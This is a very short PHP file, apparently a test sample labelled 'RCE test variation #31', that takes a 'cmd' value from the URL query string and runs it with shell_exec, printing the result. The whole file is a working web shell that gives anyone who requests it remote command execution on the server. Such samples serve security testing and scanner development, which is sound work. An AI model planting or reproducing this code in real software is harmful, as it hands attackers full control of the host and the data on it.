<?php
// RCE test variation #31
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>